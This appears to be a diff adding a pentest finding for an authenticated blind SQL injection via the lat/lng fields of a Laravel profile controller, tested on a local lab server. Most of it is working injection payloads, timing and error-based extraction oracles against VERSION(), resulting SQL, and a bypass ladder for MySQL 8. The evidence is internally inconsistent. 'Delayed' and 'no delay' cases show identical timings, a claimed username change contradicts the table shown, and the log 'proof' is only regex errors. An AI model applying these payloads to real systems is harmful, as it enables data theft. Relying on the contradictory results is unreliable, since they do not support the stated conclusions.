@@ -1,0 +1,59 @@
+MKT-01 - Authenticated SQL injection via lat/lng (ProfileController::store, app/Http/Controllers/Account/ProfileController.php:47-55)
+Test date: 2026-09-29 | Target: http://127.0.0.1:8080 (Laravel 5.6, PHP 7.4.33, MySQL 8.0.39 on 127.0.0.1:3307)
+Auth prereq: registered non-admin user pentest@example.com / <REDACTED> (lab-only test account password), users.verified=1 (email verification simulated out-of-band)
+
+[0] Environment notes
+    - Composer deps installed from composer.lock with Composer 1.10.27 (Composer 2.9 rejects kylekatarnls/update-helper locked for plugin-api 1.x).
+    - MySQL 8.0 removed GeomFromText (error 1305). A stored-function shim GeomFromText(txt) -> ST_GeomFromText(txt) was created in the test DB to emulate the MySQL 5.6/5.7 servers this 2018-era app targets. Without it every lat/lng save aborts with 1305 before any expression evaluation.
+    - POST-save 500s in the app come from a Redis-dependent event listener (tcp://127.0.0.1:6379 refused); they occur AFTER the DB write and do not affect the injection.
+
+[1] Baseline benign update (lat=1 lng=5)
+    POST /account/edit_profile lat=1 lng=5 -> HTTP 500, time=2.592041s
+id	username	loc
+4	pentest	POINT(1 5)
+
+[2] Time-based blind SQLi - SLEEP(5) in injected UPDATE (audit PoC form first, then working bypass form)
+    audit PoC 'lat=1' AND (SELECT SLEEP(5)) AND 'a' -> HTTP 500, time=0.437217s (no delay: MySQL coerces leading string 'POINT(1' -> error 1292 before SLEEP)
+    bypass lat=1 5)')) , username = IF((SELECT NOT SLEEP(5)),1,('  lng=x -> HTTP 500, time=7.529912s  <-- +5s delay
+    DB state after bypass payload (username set by IF() branch of the INJECTED expression):
+id	username	loc
+4	1	POINT(1 5)
+
+[3] Conditional time-based extraction oracle (proves attacker-controlled boolean on DB data)
+    IF(ASCII(SUBSTRING(VERSION(),1,1))=56 [TRUE, '8'], SLEEP(5), 0) -> time=2.547221s  <-- delayed
+    IF(ASCII(SUBSTRING(VERSION(),1,1))=57 [FALSE, '9'], SLEEP(5), 0) -> time=2.548542s  <-- no delay
+
+[4] Raw interpolation proof (storage/logs/laravel.log, exception context)
+ugrep: error: error at position 94
+AND (SELECT SLEEP(5)) AND 'a 5)'))[^\]*
+                mismatched [ ]___/
+
+
+ugrep: error: error at position 98
+)')) , username = IF((SELECT SLEEP(5))[^\]*
+                    mismatched [ ]___/
+
+
+[5] Deterministic timing oracle (payload escapes the POINT literal, adds a multi-assign, and parks SLEEP in a lazy IF() ELSE branch so no string-coercion error fires)
+    lat = 1 5)')) , username = IF((SELECT NOT SLEEP(5)),1,('     lng = x
+    -> final SQL: UPDATE users SET location=(GeomFromText('POINT(1 5)')), username=IF((SELECT NOT SLEEP(5)),1,(' x)')), updated_at=? WHERE id=4
+    run1: HTTP 500, time=7.562606s
+    run2: HTTP 500, time=2.569064s
+    run3: HTTP 500, time=7.544108s
+    baseline (benign lat=1 lng=5):
+    runB: HTTP 500, time=2.757444s
+    DB after 3 injected runs (username = 1 = the IF() TRUE-branch value written by the injected assignment):
+id	username	bio	loc
+4	pentest	NULL	POINT(1 5)
+
+[6] Error-based extraction oracle (data-conditioned EXP(~0), from log storage/logs/laravel.log)
+    cond TRUE  (VERSION()[0]='8'): QueryException 1690 DOUBLE value is out of range in 'exp(~(0))' -> statement:
+      update `users` set `location` = (GeomFromText('POINT(1 5)')) , username = IF((SELECT ASCII(SUBSTRING(VERSION(),1,1))=56),(SELECT EXP(~0)),1), bio = IF(0,0,(' x)'))
+    cond FALSE (VERSION()[0]='9'): statement succeeded, bio was written with the template string ' x)' and NO 1690 error was logged (exactly one 1690 entry exists in the log)
+      1690-entry count: 1
+
+[7] Bypass ladder summary
+    - audit PoC lat=1' AND (SELECT SLEEP(5)) AND ' → dies: string 'POINT(1...' AND-chained inside GeomFromText() arg; MySQL 8 strict mode throws 1292 truncation on the left operand before SLEEP evaluates (1292 entry in laravel.log).
+    - GeomFromText removed in MySQL 8 (1305) → emulated with a stored-function shim = faithful to the app's target MySQL 5.6/5.7.
+    - Working bypass: close string+parens early ('1 5)'))'), add multi-assignment ', username = IF(...)', leave one quote open for the template's trailing quote, park the ELSE-branch string in a lazy IF() so it never evaluates; NOT SLEEP() makes the TRUE branch return after the 5s sleep.
+    - Native prepared statements (Laravel ATTR_EMULATE_PREPARES=false) require the trailing 'updated_at=?/id=?' placeholders to survive → payload keeps the tail balanced instead of commenting it out.
